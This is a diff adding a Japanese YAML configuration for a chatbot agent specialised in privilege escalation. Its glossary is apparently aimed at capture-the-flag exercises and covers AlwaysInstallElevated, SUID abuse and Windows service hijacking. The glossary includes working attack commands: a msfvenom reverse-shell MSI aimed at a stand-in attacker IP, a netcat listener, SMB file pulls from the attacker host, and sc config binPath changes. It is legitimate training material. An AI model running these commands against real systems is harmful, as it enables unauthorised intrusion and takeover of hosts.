@@ -1,0 +1,186 @@
+name: PrivilegeEscalationSpecialist
+description: あなたはPrivilegeEscalation(権限昇格)に特化したサイバーセキュリティの専門エージェントです。日本語で丁寧に回答してください。コマンドについて聞かれた際は、構造化して回答してください。
+composition_mode: fluid
+max_engine_iterations: 3
+
+guidelines:
+  - condition: ユーザーが権限昇格(PrivilegeEscalation)以外の話題を出した場合
+    action: 申し訳ありませんが、私は権限昇格(PrivilegeEscalation)に特化したエージェントです。それ以外の話題には詳しくありませんが、関連する質問があればぜひお答えします。と答えてください。
+    
+  - condition: 質問されたとき
+    action: 質問に対応した回答をしてください。
+  
+  - condition: ユーザーの質問で、意味が曖昧な単語や略称が含まれていたとき
+    action: 文脈に応じて考えられる複数の解釈を提示し、「どちらの意味か教えてください」と丁寧に確認してください。
+
+  - condition: ユーザーが単語（単語のみの短い入力）を入力したとき
+    action: 単語の意味を説明し、必要に応じて偵察（）との関連を解説してください。用語集（glossary）にある場合は、その定義をもとに分かりやすく回答してください。
+
+  - condition: わからないことを言われたとき
+    action: わからないと答える。
+
+glossary:
+- term: AlwaysInstallElevated
+  definition: Windowsのグループポリシー設定で、MSIインストーラーを管理者権限で実行できるようにする機能。ユーザーとマシン両方でこの設定が有効な場合、低権限ユーザーが管理者権限を持つMSIファイルを実行し、権限昇格が可能になる。
+
+- term: 権限昇格（Privilege Escalation）
+  definition: 本来のアクセス権限を超えて、より高い権限（例 Administrator）を不正に取得する行為。Windowsではポリシー設定のミスや脆弱な設定を利用されることがある。
+
+- term: MSIファイル
+  definition: Microsoft Installer（拡張子 `.msi`）形式のインストーラーファイル。アプリケーションやスクリプトをインストール・実行するために使用される。AlwaysInstallElevatedの設定が有効な場合、これを用いて権限昇格が可能。
+
+- term: グループポリシー（Group Policy）
+  definition: Windows OSで管理者がユーザーやコンピューターの設定を集中管理するための機能。AlwaysInstallElevatedはその中のポリシー設定の一つ。
+
+- term: レジストリ（Registry）
+  definition: Windowsの構成情報を保持するデータベース。AlwaysInstallElevatedの設定はレジストリの以下のキーに保存される：
+    - `HKCU\Software\Policies\Microsoft\Windows\Installer`
+    - `HKLM\Software\Policies\Microsoft\Windows\Installer`
+
+- term: bypassuac.msi
+  definition: 権限昇格を目的としたMSIファイルの一例。AlwaysInstallElevatedが有効な環境で、任意のコマンドを管理者権限で実行できるよう構成されたMSIファイル。
+
+- term: msiexec
+  definition: Windowsのインストーラーをコマンドラインから実行するためのコマンド。`msiexec /quiet /qn /i ファイル.msi` で、MSIを静かにインストールできる。
+
+- term: ポリシー無効化
+  definition: AlwaysInstallElevatedを無効にすることで、MSIファイルを管理者権限で自動的に実行されるのを防止する。具体的にはレジストリ値 `AlwaysInstallElevated` を0に設定する。
+
+- term: セキュリティベストプラクティス
+  definition: AlwaysInstallElevatedを「無効」にし、ユーザーに管理者権限を与えないなどの設定を徹底することで、意図しない権限昇格のリスクを防ぐ手法。
+
+- term: xfreerdp
+  definition: Linux環境などからRDP接続（リモートデスクトップ）を行うためのコマンドラインツール。`/u`, `/p`, `/v` オプションでユーザー名・パスワード・接続先IPを指定する。
+
+- term: AlwaysInstallElevatedポリシー確認
+  definition: 　`reg query` コマンドを使って、ユーザーおよびマシンレベルで `AlwaysInstallElevated` の設定が有効（値が1）かを確認する操作。両方有効である必要がある。
+    - `reg query HKCU\Software\Policies\Microsoft\Windows\Installer`
+    - `reg query HKLM\Software\Policies\Microsoft\Windows\Installer`
+
+- term: 権限昇格MSIファイル作成
+  definition: msfvenom や WiX Toolset などを用いて、管理者権限で任意のコマンド（例 リバースシェル）を実行する `.msi` ファイルを作成する手法。
+
+- term: msfvenom
+  definition: Kali Linuxなどに含まれるツールで、ペイロード（リバースシェルなど）を埋め込んだ実行ファイルやスクリプトを生成できる。MSI形式にも対応。
+    - 例　 `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<攻撃者IP> LPORT=4444 -f msi -o shell.msi`
+
+- term: リバースシェル
+  definition: 標的側から攻撃者のマシンへシェル接続を張る通信方式。Firewallの内側から接続されるため、検知されにくく、権限昇格確認にも用いられる。
+
+- term: nc（Netcat）
+  definition: TCP/UDP接続に使えるコマンドラインツール。リバースシェルの受信側として使われることが多い。
+    - 例 `nc -lvnp 4444`
+
+- term: C:\Users\Administrator\Desktop\root.txt
+  definition: 権限昇格が成功したことを確認するための「旗」（flag）ファイル。Administratorのデスクトップに配置され、内容を確認することでミッションクリアとなる。
+
+- term: SMB経由でファイル転送
+  definition: 標的マシンに対して、`smbserver.py` や Windowsの共有機能を使って `.msi` ファイルを送るテクニック。例
+    - 攻撃側 `impacket-smbserver share ./`
+    - 標的側 `copy \\<攻撃者IP>\share\shell.msi .`
+
+- term: msiexecコマンド
+  definition: 　`.msi` ファイルをコマンドラインから実行するための標準コマンド。AlwaysInstallElevatedが有効な場合、管理者権限で実行される。
+    - 例 `msiexec /quiet /qn /i shell.msi`
+
+- term: UAC回避不要な攻撃
+  definition: AlwaysInstallElevatedが有効な場合、UAC（ユーザーアカウント制御）の確認なしに管理者権限が得られるため、UACバイパス技術を使わずに済む。
+
+- term: SUID（Set User ID）
+  definition: 実行ファイルに設定される特殊なパーミッションで、そのファイルを実行する際に「所有者の権限」で動作する。rootが所有者かつSUIDが有効なバイナリは、通常ユーザーがroot権限で動作させられる可能性がある。
+
+- term: SUIDファイルの検索
+  definition: システム内でSUIDビットが設定されたファイルを探すためのコマンド。例 `find / -perm -4000 -type f 2>/dev/null`
+
+- term: SUID権限昇格
+  definition: SUIDが設定された脆弱な実行ファイルを悪用して、本来より高い権限（例 root）を得る手法。特定のバイナリ（例 `vim`, `nmap`, `python`, `bash`）などが対象となる。
+
+- term: GTFOBins
+  definition: Linuxの標準的なバイナリのうち、SUIDやsudo経由で権限昇格に利用可能なものを一覧化したリファレンス。`https://gtfobins.github.io/` にて参照できる。
+
+- term: /root/root.txt
+  definition: root権限を取得したことを証明するフラグファイル。通常ユーザはアクセスできず、権限昇格に成功した後に中身を確認する。
+
+- term: getcap / setcap
+  definition: Linuxでファイルに対してCapability（特権）を設定・確認するコマンド。SUID以外の手法による昇格の確認にも使われることがある。
+
+- term: 権限の確認（ls -l）
+  definition: ファイルのアクセス権限やSUIDビットの有無を確認するための基本コマンド。SUIDはパーミッション欄の実行ビットが `s` に変化していることで見分ける。
+
+- term: SUID付きバイナリの悪用
+  definition: 　`nmap`, `less`, `vim`, `find`, `tar`, `perl`, `python`, `bash` などのSUID付きバイナリに対して、GTFOBinsのテクニックを用いてrootシェルを奪取する行為。
+
+- term: /etc/passwd書き換え
+  definition: 一部のSUIDバイナリでは `/etc/passwd` を書き換えることで新たなrootユーザーを作成することが可能。高度なテクニックだが脆弱な設定で成立する場合がある。
+
+- term: AccessChk
+  definition: Microsoft Sysinternalsが提供するツールで、指定したファイルやサービスのアクセス権を確認できる。サービスの脆弱なアクセス制御（誰でも書き換え可能なImagePathなど）を調査するために使用される。
+
+- term: ImagePath（サービスパス）
+  definition: Windowsサービスの実行ファイルのパスを指すレジストリ値。`HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>\ImagePath` に格納されており、ここを書き換えることで任意の実行ファイル（リバースシェルなど）をサービスとして起動可能。
+
+- term: サービスのレジストリ編集
+  definition: 　`regedit` または `reg add` コマンドでサービスの設定（特にImagePath）を変更すること。脆弱なサービスがフルアクセス可能な場合、任意のプログラムに書き換え可能。
+
+- term: sc config
+  definition: サービスの構成を変更するためのWindowsコマンドラインユーティリティ。`sc config <サービス名> binPath= <コマンド>` の形式で、ImagePathと同様の操作が可能。
+
+- term: サービス再起動
+  definition: 　`net stop <サービス名>` および `net start <サービス名>` などのコマンドにより、書き換えたサービスを再起動し、ペイロードを実行する手順。
+
+- term: サービス権限の設定ミス
+  definition: サービスの設定で、一般ユーザにレジストリやバイナリの変更権限（WRITE_DAC, WRITE_OWNER など）を許可してしまう誤設定。AccessChkで検出可能。
+
+- term: SYSTEM権限
+  definition: Windowsにおける最高権限（Administratorより上）。サービス実行時にSYSTEM権限で動作するため、サービスを書き換えて実行すればこの権限を奪取可能。
+
+- term: サービス実行アカウント
+  definition: サービスが動作する際に使われるユーザアカウント。LocalSystem（SYSTEM）であれば、サービス経由で完全な管理者権限が得られる。
+
+- term: Windowsサービス権限昇格
+  definition: 書き換え可能なサービスを利用し、ImagePathをリバースシェルに変更 → サービス再起動 → SYSTEM権限取得、という一連の手法。
+
+- term: C:\Users\Administrator\Desktop\root.txt
+  definition: 管理者（SYSTEM）権限を取得できたことを証明するフラグファイル。このミッションの最終目的地。
+
+- term: Webシェル
+  definition: Webサーバ上で動作するスクリプト型のリモートシェル。PHP、ASP、JSPなどの形式があり、リバースシェルやコマンド実行に用いられる。
+
+- term: コマンドインジェクション
+  definition: Webアプリケーションが外部コマンドを実行する際、入力内容が適切に検証されずにOSコマンドとして実行されてしまう脆弱性。
+
+- term: リモートコード実行（RCE）
+  definition: 攻撃者がネットワーク越しに任意のコードを対象マシン上で実行できる脆弱性のこと。重大なセキュリティリスクに分類される。
+
+- term: reverse shell payload
+  definition: 攻撃対象から攻撃者の端末に接続してシェルを提供するペイロード。Web脆弱性やRCEからの侵入に用いられる。
+
+- term: /app/flag1.txt
+  definition: Webアプリケーション内にある第1段階のフラグファイル。通常はRCEやファイルパスの把握によりアクセスが可能となる。
+
+- term: サブネット内調査
+  definition: 取得したシェルからローカルネットワークを調査し、他ホストの存在を確認する手法。`ip a`, `arp -a`, `nmap` などを使用。
+
+- term: ポートフォワーディング（ポート転送）
+  definition: 内部ネットワークのホストにアクセスするため、ローカルとリモートのポートを橋渡しする技術。`ssh -L`, `chisel`, `socat` などが使われる。
+
+- term: 内部横展開（Lateral Movement）
+  definition: 権限を得たホストから別のホストへ侵入範囲を広げていく攻撃手法。ピボットホストの活用や内部情報の流用が行われる。
+
+- term: CVE（Common Vulnerabilities and Exposures）
+  definition: 公開された脆弱性に一意に割り当てられた識別番号。例 `CVE-2022-22965`（Spring4Shell）など。
+
+- term: flag2.txt
+  definition: 横展開先のサーバに存在するフラグファイル。サーバ間移動や別プロセスへの攻撃成功を証明する。
+
+- term: Linuxカーネル権限昇格
+  definition: カーネルの脆弱性（例 dirtycow, overlayfs）を利用して、ローカルユーザーからrootへ昇格する攻撃。
+
+- term: ローカル権限昇格（Local Privilege Escalation）
+  definition: サーバにログインできる一般ユーザが、カーネル脆弱性やSUID設定、サービス設定ミスなどを悪用してroot権限を奪う手法。
+
+- term: flag3.txt
+  definition: サーバのroot権限を取得した際に得られる最終フラグ。ホスト内部の`/root/`や特定ユーザーのホームディレクトリに存在する。
+
+- term: Linuxローカル情報収集
+  definition: 権限昇格のために、`uname -a`, `cat /etc/os-release`, `ps aux`, `find / -perm -4000` などで対象システムの状態を把握する行為。
